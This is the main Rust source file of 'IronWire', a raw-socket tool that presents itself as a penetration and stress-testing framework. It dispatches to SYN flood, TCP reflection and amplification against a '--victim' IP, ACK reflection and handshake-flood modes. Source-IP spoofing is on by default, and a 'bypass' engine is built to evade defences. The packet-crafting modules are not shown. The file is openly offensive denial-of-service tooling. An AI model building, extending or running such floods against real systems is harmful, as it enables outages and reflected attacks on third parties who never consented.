/// IronWire — Packets don't lie, but they do get lost
///
/// Version: 4.5.0
/// Author: khaninkali · HyperSecurity Offensive Labs

mod profile;
mod session;
mod amplify;
mod reflection;
mod handshake;
mod bypass;

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

use clap::Parser;
use tokio::sync::Notify;
use tracing::info;

/// Command-line configuration for IronWire.
#[derive(Parser, Clone)]
#[command(name = "ironwire")]
#[command(about = "IronWire — TCP Raw Socket Penetration & Stress Testing Framework")]
struct Args {
    #[arg(short, long, help = "Target IP address (single target)")]
    target: Option<String>,

    #[arg(short, long, default_value = "common", help = "Ports: range (1-1000), list (80,443), or 'common'")]
    ports: String,

    #[arg(short = 'c', long, default_value = "50", help = "Concurrent connections / packet burst")]
    connections: usize,

    #[arg(short, long, default_value = "120", help = "Test duration in seconds")]
    duration: u64,

    #[arg(short = 'a', long, default_value = "scan", help = "Attack: scan, flood, reflect, amplify, ack-reflect, handshake, comprehensive")]
    attack_type: String,

    #[arg(long, default_value = "syn", help = "Scan type: syn, connect, ack, fin, xmas, null, rst")]
    scan_type: String,

    #[arg(short = 'g', long, default_value = "3", help = "Aggression 1-5 (1=slow, 5=max)")]
    aggression: u8,

    #[arg(long, default_value = "true", help = "Randomize source IP in packets")]
    source_variation: bool,

    #[arg(long, default_value = "true", help = "Randomize source port in packets")]
    random_ports: bool,

    #[arg(long, default_value = "true", help = "Randomize TCP options per packet")]
    random_options: bool,

    #[arg(long, help = "Manual target MAC override (e.g., aa:bb:cc:dd:ee:ff)")]
    target_mac: Option<String>,

    #[arg(long, help = "Network interface name (auto-detected if omitted)")]
    interface: Option<String>,

    #[arg(long, help = "Victim IP for reflection/amplification mode")]
    victim: Option<String>,

    #[arg(long, default_value = "80", help = "Reflector/amplifier port")]
    reflector_port: u16,

    #[arg(long = "amp", default_value = "80,443,22,8080", help = "Amplifier ports (comma-separated)")]
    amp_ports: String,

    #[arg(long = "servers", help = "Path to servers.txt file (one target:port per line)")]
    servers_file: Option<String>,

    #[arg(long = "hto", default_value = "5", help = "Handshake timeout in seconds")]
    handshake_timeout: u64,

    #[arg(long = "profile", default_value = "adaptive", help = "Bypass profile: silent, adaptive, aggressive")]
    profile: String,

    #[arg(long = "auto-interface", default_value = "true", help = "Auto-select best interface (prefer wlan0)")]
    auto_interface: bool,
}

/// Parses a MAC address string (aa:bb:cc:dd:ee:ff).
fn parse_mac(s: &str) -> Option<pnet::util::MacAddr> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 6 { return None; }
    let bytes: Vec<u8> = parts.iter().filter_map(|h| u8::from_str_radix(h, 16).ok()).collect();
    if bytes.len() != 6 { return None; }
    Some(pnet::util::MacAddr::new(bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]))
}

/// Program entry point: validates environment, resolves interfaces,
/// and dispatches to the selected attack mode.
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    profile::show_banner();
    tracing_subscriber::fmt::init();

    let args = Args::parse();

    if !cfg!(target_os = "linux") {
        eprintln!("[!] IronWire requires Linux (raw sockets via AF_PACKET)");
        return Ok(());
    }
    let is_root = unsafe { libc::getuid() == 0 };
    if !is_root {
        eprintln!("[!] Root required for raw socket access. Run with sudo.");
        return Ok(());
    }

    // Load targets from file or single target with ports
    let servers: Vec<(std::net::Ipv4Addr, u16)> = if let Some(ref path) = args.servers_file {
        info!("Loading targets from: {}", path);
        profile::ServersFile::load(path, 80)?.entries
    } else if let Some(ref t) = args.target {
        let ip: std::net::Ipv4Addr = t.parse()?;
        let ports = profile::parse_ports(&args.ports);
        if ports.is_empty() {
            eprintln!("[!] No valid ports specified");
            return Ok(());
        }
        ports.iter().map(|&p| (ip, p)).collect()
    } else {
        eprintln!("[!] Specify --target or --servers");
        return Ok(());
    };

    let ports = profile::parse_ports(&args.ports);
    if ports.is_empty() && args.attack_type != "handshake" {
        eprintln!("[!] No valid ports specified");
        return Ok(());
    }

    // Resolve local interface, MAC, and IP
    let iface = if let Some(ref manual) = args.interface {
        manual.clone()
    } else {
        let (name, mac, ip) = if args.auto_interface {
            profile::resolve_best_interface()
                .or_else(|| profile::resolve_interface())
                .ok_or("No network interface found")?
        } else {
            profile::resolve_interface().ok_or("No network interface found")?
        };
        info!("Interface: {} | MAC: {} | IP: {}", name, mac, ip);
        name
    };

    let (_, src_mac, src_ip) = profile::resolve_by_name(&iface)
        .or_else(|| profile::resolve_interface())
        .ok_or("Could not resolve interface info")?;
    info!("MAC: {} | IP: {}", src_mac, src_ip);

    let dst_mac = session::resolve_dst_mac(&iface, servers[0].0, args.target_mac.as_ref().and_then(|m| parse_mac(m)))
        .ok_or("Could not resolve destination MAC (try --target-mac)")?;
    info!("Target MAC: {}", dst_mac);

    // Initialize adaptive bypass engine
    let mut bypass = bypass::BypassEngine::new(&args.profile, args.aggression);
    info!("Bypass profile: {} — {}", args.profile, bypass.description());

    let stats = Arc::new(session::PacketStats::new());
    let delay_ms = bypass.next_delay();

    let notify = Arc::new(Notify::new());
    let shutdown = Arc::new(AtomicBool::new(false));
    setup_cleanup(&notify, &shutdown);

    // Dispatch to selected attack mode
    match args.attack_type.as_str() {
        "scan" => {
            info!("Port scan mode — {} targets, type: {}", servers.len(), args.scan_type);
            for &(target_ip, port) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                session::run_port_scan(&iface, src_mac, src_ip, dmac, target_ip,
                    &[port], &args.scan_type, args.random_options,
                    args.source_variation, args.random_ports, Arc::clone(&stats), &mut bypass).await;
            }
        }
        "flood" => {
            info!("SYN flood mode — {} targets, {}s", servers.len(), args.duration);
            for &(target_ip, port) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                session::run_syn_flood(&iface, src_mac, src_ip, dmac, target_ip,
                    &[port], args.connections, args.duration,
                    args.source_variation, args.random_ports, Arc::clone(&stats), &mut bypass).await;
            }
        }
        "reflect" => {
            let victim = args.victim.ok_or("--victim IP required for reflection mode")?;
            let victim_ip: std::net::Ipv4Addr = victim.parse()?;
            info!("TCP reflection mode — {} reflectors, victim: {}", servers.len(), victim);
            let reflectors: Vec<std::net::Ipv4Addr> = servers.iter().map(|&(ip, _)| ip).collect();
            reflection::run_tcp_reflection(&iface, src_mac, src_ip, dst_mac, victim_ip,
                &reflectors, args.reflector_port, args.duration, delay_ms, Arc::clone(&stats)).await;
        }
        "amplify" => {
            let victim = args.victim.ok_or("--victim IP required for amplification mode")?;
            let victim_ip: std::net::Ipv4Addr = victim.parse()?;
            let amp_ports = profile::parse_ports(&args.amp_ports);
            info!("TCP amplification mode — {} amplifiers, victim: {}", servers.len(), victim);
            for &(target_ip, _) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                let amp = amplify::run_tcp_amplify(&iface, src_mac, src_ip, dmac,
                    target_ip, victim_ip, &amp_ports,
                    args.duration, delay_ms, Arc::clone(&stats)).await;
                info!("Amplification vs {} — factor: {:.2}x, sent: {}, recv: {}",
                    target_ip, amp.amplification_factor(),
                    amp.total_sent.load(Ordering::Relaxed),
                    amp.total_recv.load(Ordering::Relaxed));
            }
        }
        "ack-reflect" => {
            let victim = args.victim.ok_or("--victim IP required for ACK reflection")?;
            let victim_ip: std::net::Ipv4Addr = victim.parse()?;
            let reflect_ports = profile::parse_ports(&args.amp_ports);
            info!("ACK reflection mode — {} reflectors, victim: {}", servers.len(), victim);
            for &(target_ip, _) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                let amp = amplify::run_ack_reflection_amplify(&iface, src_mac, src_ip, dmac,
                    target_ip, victim_ip, &reflect_ports,
                    args.duration, delay_ms, Arc::clone(&stats)).await;
                info!("ACK reflection vs {} — sent: {}, rst: {}",
                    target_ip, amp.total_sent.load(Ordering::Relaxed),
                    amp.total_recv.load(Ordering::Relaxed));
            }
        }
        "handshake" => {
            info!("3-way handshake flood — {} targets, {} conns each", servers.len(), args.connections);
            if !handshake::suppress_kernel_rst() {
                eprintln!("[!] iptables RST suppression failed — handshake may be unreliable (kernel RST race)");
            }
            let _guard = handshake::RstGuard::arm();
            for &(target_ip, port) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                handshake::run_handshake_flood(&iface, src_mac, src_ip, dmac,
                    target_ip, &[port], args.connections,
                    args.duration, delay_ms, Arc::clone(&stats)).await;
            }
        }
        _ => {
            info!("Comprehensive mode — scan + flood");
            for &(target_ip, port) in &servers {
                let dmac = session::resolve_dst_mac(&iface, target_ip, None).unwrap_or(dst_mac);
                let opened = session::run_port_scan(&iface, src_mac, src_ip, dmac, target_ip,
                    &[port], &args.scan_type, args.random_options,
                    args.source_variation, args.random_ports, Arc::clone(&stats), &mut bypass).await;
                let target_ports: Vec<u16> = if opened.is_empty() { vec![port] } else { opened.into_iter().collect() };
                session::run_syn_flood(&iface, src_mac, src_ip, dmac, target_ip,
                    &target_ports, args.connections, args.duration,
                    args.source_variation, args.random_ports, Arc::clone(&stats), &mut bypass).await;
            }
        }
    }

    let sent = stats.packets_sent.load(Ordering::Relaxed);
    let failed = stats.packets_failed.load(Ordering::Relaxed);
    let opened = stats.open_ports.load(Ordering::Relaxed);
    info!("Done — sent: {}, failed: {}, open: {}", sent, failed, opened);

    Ok(())
}

/// Registers a Ctrl+C handler that signals shutdown.
fn setup_cleanup(n: &Arc<Notify>, s: &Arc<AtomicBool>) {
    let n = Arc::clone(n);
    let s = Arc::clone(s);
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        s.store(true, Ordering::Relaxed);
        n.notify_waiters();
    });
}
